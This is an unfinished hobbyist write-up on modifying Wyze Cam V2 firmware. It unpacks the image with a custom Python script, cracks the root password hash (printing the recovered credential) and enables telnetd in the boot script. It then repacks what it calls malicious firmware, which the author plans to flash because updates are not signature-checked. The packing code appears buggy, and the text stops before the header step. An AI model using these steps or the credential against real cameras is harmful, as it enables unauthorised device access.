# Wyze Whisper

In this writeup I will show you how to hack an IoT camera (Wyze Cam indoor V2) by abusing its firmware upgrade process.
The firmware upgrade process does not validate the origin of the provided firmware,
therefore it makes it able for an attacker to flash his own malicious firmware.

# Extraction
Let's install the vulnerable firmware and unzip it 

```bash
$ wget https://download.wyzecam.com/firmware/v2/demo_v2_4.9.5.36.bin.zip
[ . . . ]
$ unzip demo_v2_4.9.5.36.bin.zip
Archive:  demo_v2_4.9.5.36.bin.zip
  inflating: demo_v2_4.9.5.36.bin    
  inflating: __MACOSX/._demo_v2_4.9.5.36.bin  
$ ls
 __MACOSX
 demo_v2_4.9.5.36.bin
 demo_v2_4.9.5.36.bin.zip
```
The firmware was packed on Mac. 
We can safely remove `__MACOSX` since it contains useless metadata that Mac creates


We will use *binwalk* to examine the image.

```bash
$ binwalk -t demo_v2_4.9.5.36.bin
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0xCDF0042E, created: 2019-11-15 07:00:02, image size: 11075584 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x869272CE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: none, image name: "jz_fw"
64            0x40            uImage header, header size: 64 bytes, header CRC: 0xD3B9E871, created: 2019-02-14 03:00:10, image size: 1859813 bytes, Data Address: 0x80010000, Entry Point: 0x80400630, data CRC: 0xE3786CEF, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: "Linux-3.10.14"
128           0x80            LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes
2097216       0x200040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 3353204 bytes, 407 inodes, blocksize: 131072 bytes, created: 2019-05-21 17:22:45
5570624       0x550040        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 572594 bytes, 12 inodes, blocksize: 131072 bytes, created: 2018-08-13 04:50:58
6225984       0x5F0040        JFFS2 filesystem, little endian
```
We can see it contains 2 `squashfs` partitions.
It is a read-only filesystem and is commonly found in embeded devices such as this one!
And also a `JFFS2` partition.

Now instead of using `binwalk` to extract the image, let's write our own python script to do that. 
We also need to add a packing functionality since later on we will need to pack our malicious firmware in order to flash it to the camera.

We will start by adding some command line arguments.

```py
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("--mode", required=False, choices=["pack", "unpack"], help="Mode to use [pack, unpack]")
parser.add_argument("--binary", required=True, help="Binary to [pack, unkpack]")

args = parser.parse_args()
```

Now we need to create a class to represent a firmware part.

```py
class FirmwarePart:
    def __init__(self, name: str, offset: hex, size: hex) -> None:
        self.name = name
        self.offset = offset
        self.size = size

    def __repr__(self):
        keywords = [f"{key} - {value!r} | " for key, value in self.__dict__.items()]
        return "".join(keywords)
```

Great! Now we can create a list of tuples that contain the `(name, offset, size)` of each firmware part,
and use them to create our `FirmwarePart` objects.
We add a usefull name, the offset and calculate the size by checking where the next part starts.

```py
_parts = [
    ("uimage_header", 0x0, 0x40),
    ("uimage_kernel", 0x40, 0x200000),
    ("squashfs_1", 0x200040, 0x350000),
    ("squashfs_2", 0x550040, 0xA0000),
    ("jffs2", 0x5F0040, 11075648 - 0x5F0040),
]
```

```py
firmware_parts = []

for part in _parts:
    part = FirmwarePart(*part)
    firmware_parts.append(part)

    print(f"Prepared part: {part}")
```

Now let's add the unpacking utility.
For each firmware part, we will open the given binary and start reading from the parts offset (the point in the binary where the part begins).
Afterwards we read the amount of data specified by the size of the part from the binary and write it to a file.

```py
if args.mode == "unpack":
    for part in firmware_parts:
        with open(args.binary, "rb") as bin:
            bin.seek(part.offset)
            data = bin.read(part.size)
        with open(part.name, "wb") as out:
            out.write(data)

        print(f"Wrote {part.name} - {hex(len(data))} bytes")
```

We will now use the `subprocess` module to use `squashfs-tools` and `jefferson` in order to extract the files.

```py
[ . . . ]
    args_ = [
        ["unsquashfs", "-d", "squashfs_1_out", "squashfs_1"],
        ["unsquashfs", "-d", "squashfs_2_out", "squashfs_2"],
        ["jefferson", "-d", "jffs2_out", "jffs2"]
    ]

    for args in args_:
        print(f"Running: {''.join(args)}")
        subprocess.Popen(args)

```

Now let's run our script

```bash
$ mkdir wyze
$ cd wyze
$ python ../extractor.py --mode unpack --binary ../demo_v2_4.9.5.36.bin
Prepared part: name - 'uimage_header' | offset - 0 | size - 64 | 
Prepared part: name - 'uimage_kernel' | offset - 64 | size - 2097152 | 
Prepared part: name - 'squashfs_1' | offset - 2097216 | size - 3473408 | 
Prepared part: name - 'squashfs_2' | offset - 5570624 | size - 655360 | 
Prepared part: name - 'jffs2' | offset - 6225984 | size - 4849664 | 
Wrote uimage_header - 0x40 bytes
Wrote uimage_kernel - 0x200000 bytes
Wrote squashfs_1 - 0x350000 bytes
Wrote squashfs_2 - 0xa0000 bytes
Wrote jffs2 - 0x4a0000 bytes
Running: unsquashfs-dsquashfs_1_outsquashfs_1
Running: unsquashfs-dsquashfs_2_outsquashfs_2
Running: jefferson-djffs2_outjffs2
Parallel unsquashfs: Using 2 processors
368 inodes (127 blocks) to write

Parallel unsquashfs: Using 2 processors
11 inodes (24 blocks) to write

[=======================================================================================================================================|] 35/35 100%

created 11 files
created 1 directory
created 0 symlinks
created 0 devices
created 0 fifos
created 0 sockets
created 0 hardlinks
[=====================================================================================================================================/] 495/495 100%

created 62 files
created 39 directories
created 306 symlinks
created 0 devices
created 0 fifos
created 0 sockets
created 0 hardlinks
dumping fs to /home/skeleton/projects/wyze_cam/wyze/jffs2_out (endianness: <)
Jffs2_raw_inode count: 64
Jffs2_raw_dirent count: 64
[ . . . ]
----------
```

We succesfully unpacked the binary and extracted the file systems!

```bash
$ ls 
 jffs2
 jffs2_out
 squashfs_1
 squashfs_1_out
 squashfs_2
 squashfs_2_out
 uimage_header
 uimage_kernel
```

Let's take a look inside our extracted file systems.

## JFFS2
The JFFS2 file system contains directories with binaries, libraries and a lot of config files.

## Squashfs

- The first squashfs (`squashfs_1_out`) contains the root file system

```bash
$ ls squashfs_1_out
 backupa   backupk   configs   driver   lib       media   opt      proc   run    sys      thirdlib   usr
 backupd   bin       dev       etc      linuxrc   mnt     params   root   sbin   system   tmp        var
```

- The second squashfs (`squashfs_2_out`) contains some **object files** (kernel modules) that are used to extend the kernel.

```bash
$ ls squashfs_2_out
 audio.ko   rtl8189ftv.ko     sample_pwm_core.ko   sample_speakerctl.ko   sensor_jxf23.ko   tx-isp.ko
 exfat.ko   sample_motor.ko   sample_pwm_hal.ko    sensor_jxf22.ko        sinfo.ko
```

Let's examine the root file system's `etc/` directory.

```bash
$ ls squashfs_1_out/etc
 app      fstab   hostname   init.d    miio          miio_client_up   passwd    protocols     sensor   TZ
 config   group   hosts      inittab   miio_client   os-release       profile   resolv.conf   shadow   webrtc_profile.ini
```

Well we can see a `shadow` as well as a `passwd` file. 
Let's try and crack the hash using john.

```bash
$ john --fork=4 shadow
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: MaxLen = 13 is too large for the current hash type, reduced to 8
ismart(12)          (root)
[ . . . ]
```
Okay we got the root password. Now let's see where we wil be able to use it.
Scripts that run on boot are usually located in `/etc/init.d/`

```bash
$ ls -l etc/init.d
rwx------ 1.8k skeleton 12 Jan  2018  rcS
```

```bash
#!/bin/sh

# Set mdev
echo /sbin/mdev > /proc/sys/kernel/hotplug
/sbin/mdev -s && echo "mdev is ok......"

# create console and null node for nfsroot
#mknod -m 600 /dev/console c 5 1
#mknod -m 666 /dev/null c 1 3

# Set Global Environment
export PATH=/bin:/sbin:/usr/bin:/usr/sbin
export PATH=/system/bin:$PATH
export LD_LIBRARY_PATH=/system/lib
export LD_LIBRARY_PATH=/thirdlib:$LD_LIBRARY_PATH

# networking
ifconfig lo up
#ifconfig eth0 192.168.1.80

# Start telnet daemon
telnetd &

# Set the system time from the hardware clock
#hwclock -s

#set the GPIO PC13 to high, make the USB Disk can be use
cd /sys/class/gpio
echo 77 > export       #申请GPIO
cd gpio77
echo out > direction   #设置为输出模式
echo 0 > active_low    #value是0,表示低电平。value是1,表示高电平
echo 1 > value         #设置电平（输出模式）

# Mount driver partition
mount -t squashfs /dev/mtdblock3 /driver

# Mount system partition
mount -t jffs2 /dev/mtdblock4 /system

# Mount backup partition
#mount -t jffs2 /dev/mtdblock5 /backupk

# Mount backup partition
#mount -t jffs2 /dev/mtdblock6 /backupd

# Mount backup partition
mount -t jffs2 /dev/mtdblock7 /backupa

# Mount configs partition
mount -t jffs2 /dev/mtdblock8 /configs

# Mount params partition
mount -t jffs2 /dev/mtdblock9 /params

# Format system patition if it is invalid
if [ ! -f /system/.system ]; then
    echo "Format system partition..."
    umount -f /system
    flash_eraseall /dev/mtd4
    mount -t jffs2 /dev/mtdblock4 /system
    cd /system
    mkdir -p bin init etc/sensor lib/firmware lib/modules
    echo "#!/bin/sh" > init/app_init.sh
    chmod 755 init/app_init.sh
    touch .system
    cd /
    echo "Done"
fi

# Run init script
if [ -f /system/init/app_init.sh ]; then
    /system/init/app_init.sh &
fi
```

It seems like it runs a telnet daemon. This means we can connect to the camera remotely.
I've setup the camera on my local network but trying to connect to it gives me a connection refused error.

```bash
$ telnet -d 192.168.0.43
Trying 192.168.0.43
telnet: Unable to connect to remote host: Connection refused
```

Searching for the string *telnetd* gives the following results:

```bash
$ cd wyze && grep -r telnetd .
grep: ./squashfs_1_out/bin/busybox: binary file matches
./squashfs_1_out/etc/init.d/rcS:telnetd &
grep: ./jffs2_out/bin/test_UP: binary file matches
grep: ./jffs2_out/bin/iCamera: binary file matches
```

We can see a match in `./jffs2_out/bin/iCamera`.

```bash
$ strings ./jffs2_out/bin/iCamera | grep telnetd
killall -9 telnetd;telnetd &
telnetd &
killall -9 telnetd
```

Okay so it is infact kills all *telnetd* processes.
Although *telnetd* is just a link to *busybox*

```bash
$ ls -l squashfs_1_out/sbin/telnetd
lrwxrwxrwx 14 skeleton  4 May  2019  squashfs_1_out/sbin/telnetd -> ../bin/busybox
```

BusyBox is a suite that provides multiple utilities in a single executable.
We can use the BusyBox binary to run telnetd. To do that we modify the `etc/init.d/rcS` file

```bash
[ . . . ]
# Start telnetd daemon
busybox telnetd &
[ . . . ]
```

Now we need to generate a new firmware image.
Since we only modified the squashfs_1 partition we only need to pack that file system.
It needs to use the same settings as the original file system. To obtain these we will use `unsquashfs` once again.
I decided to be extra cool and modify our `extractor.py` script.

To clean things out a bit let's add a `make_fsystem()` function which will do the heavy lifting for us. 
That's what the script is all about anyways (besides learning and experimenting)!
This function extracts the settings from the `unsquashfs -s` command (pretty cool string manipulation) and passes them to `mksquashfs` to create the new filesystem.

```py
def make_fsystem() -> None:
    args_ = ["unsquashfs", "-s", "squashfs_1"]
    process = subprocess.Popen(args_, stdout=subprocess.PIPE)
    out, _ = process.communicate()
    out = out.decode("utf-8")

    args_ = [
        "mksquashfs",
        "squashfs_1_out",
        "squashfs_1_new",
        "-comp",
        out.split("Compression ", 2)[1].split("\n")[0],
        "-b",
        out.split("Block size ", 2)[1].split("\n")[0],
    ]
    subprocess.Popen(args_)
```

Let's also add the mode

```py
if args.mode == "make":
    make_fsystem()
```

Finally, we add the *pack* mode which creates the new binary.

```py
if args.mode == "pack":
    # Combine with kernel and other filesystems
    for part in firmware_parts[1:]:
        with open(part.name, "rb") as f:
            data = f.read(part.size)
        with open(args.binary, "wb") as bin:
            bin.write(data)
            padding = part.size - len(data)

            print(f"Wrote {part.name} - {hex(len(data))} bytes")
            print(f"Padding: {hex(padding)}")
            bin.write(b"\x00" * padding)
```

Now let's run our script

```bash
$ cd wyze && python ../extractor.py --mode make
Prepared part: name - 'uimage_header' | offset - 0 | size - 64 | 
Prepared part: name - 'uimage_kernel' | offset - 64 | size - 2097152 | 
Prepared part: name - 'squashfs_1' | offset - 2097216 | size - 3473408 | 
Prepared part: name - 'squashfs_2' | offset - 5570624 | size - 655360 | 
Prepared part: name - 'jffs2' | offset - 6225984 | size - 4849664 | 
Parallel mksquashfs: Using 2 processors
Creating 4.0 filesystem on squashfs_1_new, block size 131072.
[=====================================================================================================================================-] 127/127 100%

Exportable Squashfs 4.0 filesystem, xz compressed, data block size 131072
	compressed data, compressed metadata, compressed fragments,
	compressed xattrs, compressed ids
	duplicates are removed
Filesystem size 3274.65 Kbytes (3.20 Mbytes)
	31.81% of uncompressed filesystem size (10294.51 Kbytes)
Inode table size 2392 bytes (2.34 Kbytes)
	15.88% of uncompressed inode table size (15060 bytes)
Directory table size 3434 bytes (3.35 Kbytes)
	52.60% of uncompressed directory table size (6529 bytes)
Number of duplicate files found 1
Number of inodes 408
Number of files 63
Number of fragments 14
Number of symbolic links 306
Number of device nodes 0
Number of fifo nodes 0
Number of socket nodes 0
Number of directories 39
Number of hard-links 0
Number of ids (unique uids + gids) 2
Number of uids 1
	skeleton (1000)
Number of gids 1
	wheel (998)
```

We succesfully made the file system. Now we need to combine it with the kernel and the other file systems.
For that we will use our scripts `pack` utility.

```bash
$ python ../extractor.py --mode pack --binary firmware_mal.bin
Prepared part: name - 'uimage_header' | offset - 0 | size - 64 | 
Prepared part: name - 'uimage_kernel' | offset - 64 | size - 2097152 | 
Prepared part: name - 'squashfs_1' | offset - 2097216 | size - 3473408 | 
Prepared part: name - 'squashfs_2' | offset - 5570624 | size - 655360 | 
Prepared part: name - 'jffs2' | offset - 6225984 | size - 4849664 | 
Wrote uimage_kernel - 0x200000 bytes
Padding: 0x0
Wrote squashfs_1 - 0x350000 bytes
Padding: 0x0
Wrote squashfs_2 - 0xa0000 bytes
Padding: 0x0
Wrote jffs2 - 0x4a0000 bytes
Padding: 0x0
```

We are almost done. We only need to create the image header.

---- WILL BE MADE TOMORROW IM TIRED AF ----
